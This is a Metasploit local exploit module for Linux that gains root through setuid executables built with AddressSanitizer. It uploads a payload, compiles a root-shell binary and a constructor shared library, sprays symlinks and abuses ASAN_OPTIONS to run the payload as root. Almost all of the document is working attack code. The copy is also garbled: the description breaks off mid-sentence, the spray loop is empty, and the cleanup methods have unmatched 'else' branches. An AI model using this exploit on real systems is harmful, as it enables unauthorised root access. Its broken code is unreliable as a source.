# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;AddressSanitizer (ASan) SUID Executable Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges on Linux systems using
        setuid executables compiled with AddressSanitizer (ASan).

        ASan configuration related environment variables are permitted when
        executing setuid executables built with libasan. The `log_path` option
        can be set using the `ASAN_OPTIONS` environment variable, allowing
        clobbering of arbitrary files, with the privileges of the setuid user.

        This module uploads a shared object and sprays symlinks to overwrite
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Szabolcs Nagy&#039;, # Discovery and PoC
          &#039;infodox&#039;,       # unsanitary.sh Exploit
          &#039;bcoles&#039;         # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;2016-02-17&#039;,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           =>
        [
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
      &#039;Targets&#039;        => [[&#039;Auto&#039;, {}]],
      &#039;DefaultOptions&#039; =>
        {
          &#039;AppendExit&#039;       => true,
          &#039;PrependSetresuid&#039; => true,
          &#039;PrependSetresgid&#039; => true,
          &#039;PrependFork&#039;      => true
        },
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://seclists.org/oss-sec/2016/q1/363&#039;],
          [&#039;URL&#039;, &#039;https://seclists.org/oss-sec/2016/q1/379&#039;],
          [&#039;URL&#039;, &#039;https://gist.github.com/0x27/9ff2c8fb445b6ab9c94e&#039;],
          [&#039;URL&#039;, &#039;https://github.com/bcoles/local-exploits/tree/master/asan-suid-root&#039;]
        ],
      &#039;Notes&#039; =>
        {
          &#039;AKA&#039; => [&#039;unsanitary.sh&#039;]
        },
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptString.new(&#039;SUID_EXECUTABLE&#039;, [true, &#039;Path to a SUID executable compiled with ASan&#039;, &#039;&#039;]),
      OptInt.new(&#039;SPRAY_SIZE&#039;, [true, &#039;Number of PID symlinks to create&#039;, 50])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;]
  end

  def suid_exe_path
    datastore[&#039;SUID_EXECUTABLE&#039;]
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
  end

  def upload_and_compile(path, data, gcc_args=&#039;&#039;)
    upload "#{path}.c", data

    gcc_cmd = "gcc -o #{path} #{path}.c"
    if session.type.eql? &#039;shell&#039;
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end

    unless gcc_args.to_s.blank?
      gcc_cmd << " #{gcc_args}"
    end

    output = cmd_exec gcc_cmd

    unless output.blank?
      print_error &#039;Compiling failed:&#039;
      print_line output
    end

    register_file_for_cleanup path
    chmod path
  end

  def check
    unless setuid? suid_exe_path
      vprint_error "#{suid_exe_path} is not setuid"
      return CheckCode::Safe
    end
    vprint_good "#{suid_exe_path} is setuid"

    # Check if the executable was compiled with ASan
    #
    # If the setuid executable is readable, and `ldd` is installed and in $PATH,
    # we can detect ASan via linked libraries. (`objdump` could also be used).
    #
    # Otherwise, we can try to detect ASan via the help output with the `help=1` option.
    # This approach works regardless of whether the setuid executable is readable,
    # with the obvious disadvantage that it requires invoking the executable.
    if cmd_exec("test -r #{suid_exe_path} && echo true").to_s.include?(&#039;true&#039;) && command_exists?(&#039;ldd&#039;)
      unless cmd_exec("ldd #{suid_exe_path}").to_s.include? &#039;libasan.so&#039;
        vprint_error "#{suid_exe_path} was not compiled with ASan"
        return CheckCode::Safe
      end
    else
      unless cmd_exec("ASAN_OPTIONS=help=1 #{suid_exe_path}").include? &#039;AddressSanitizer&#039;
        vprint_error "#{suid_exe_path} was not compiled with ASan"
        return CheckCode::Safe
      end
    end
    vprint_good "#{suid_exe_path} was compiled with ASan"

    unless has_gcc?
      print_error &#039;gcc is not installed. Compiling will fail.&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;gcc is installed&#039;

    CheckCode::Appears
  end

  def exploit
    unless check == CheckCode::Appears
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    unless writable? pwd.to_s.strip
      fail_with Failure::BadConfig, "#{pwd.to_s.strip} working directory is not writable"
    end

    if nosuid? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is mounted nosuid"
    end


    payload_name = ".#{rand_text_alphanumeric 5..10}"
    payload_path = "#{base_dir}/#{payload_name}"
    upload_and_chmodx payload_path, generate_payload_exe

    rootshell_name = ".#{rand_text_alphanumeric 5..10}"
    @rootshell_path = "#{base_dir}/#{rootshell_name}"
    rootshell = <<-EOF
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
int main(void)
{
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", NULL);
}
    EOF
    upload_and_compile @rootshell_path, rootshell, &#039;-Wall&#039;

    lib_name = ".#{rand_text_alphanumeric 5..10}"
    lib_path = "#{base_dir}/#{lib_name}.so"
    lib = <<-EOF
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
void init(void) __attribute__((constructor));
void __attribute__((constructor)) init() {
  if (setuid(0) || setgid(0))
    _exit(1);
  chown("#{@rootshell_path}", 0, 0);
  chmod("#{@rootshell_path}", 04755);
  _exit(0);
}
    EOF
    upload_and_compile lib_path, lib, &#039;-fPIC -shared -ldl -Wall&#039;

    spray_name = ".#{rand_text_alphanumeric 5..10}"
    spray_path = "#{base_dir}/#{spray_name}"
    spray = <<-EOF
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
int main(void)
{
  pid_t pid = getpid();
  char buf[64];
  for (int i=0; i<=#{datastore[&#039;SPRAY_SIZE&#039;]}; i++) {
  }
}
    EOF
    upload_and_compile spray_path, spray, &#039;-Wall&#039;

    exp_name = ".#{rand_text_alphanumeric 5..10}"
    exp_path = "#{base_dir}/#{exp_name}"
    exp = <<-EOF
#!/bin/sh
#{spray_path}
#{lib_path}
ASAN_OPTIONS=&#039;disable_coredump=1 abort_on_error=1 verbosity=0&#039; "#{suid_exe_path}" >/dev/null 2>&1
    EOF
    upload_and_chmodx exp_path, exp

    print_status &#039;Launching exploit...&#039;
    output = cmd_exec exp_path
    output.each_line { |line| vprint_status line.chomp }

    unless setuid? @rootshell_path
      fail_with Failure::Unknown, "Failed to set-uid root #{@rootshell_path}"
    end
    print_good "Success! #{@rootshell_path} is set-uid root!"
    vprint_line cmd_exec "ls -la #{@rootshell_path}"

    print_status &#039;Executing payload...&#039;
    cmd_exec "echo #{payload_path} | #{@rootshell_path} & echo "
  end

  def cleanup
    # Safety check to ensure we don&#039;t delete everything in the working directory
      vprint_warning "#{datastore[&#039;SPRAY_SIZE&#039;]} symlinks may require manual cleanup in: #{pwd}"
    else
    end
  ensure
    super
  end

  def on_new_session(session)
    # Remove rootshell executable
      session.core.use &#039;stdapi&#039; unless session.ext.aliases.include? &#039;stdapi&#039;
      session.fs.file.rm @rootshell_path
    else
      session.shell_command_token "rm -f &#039;#{@rootshell_path}&#039;"
    end
  ensure
    super
  end
end

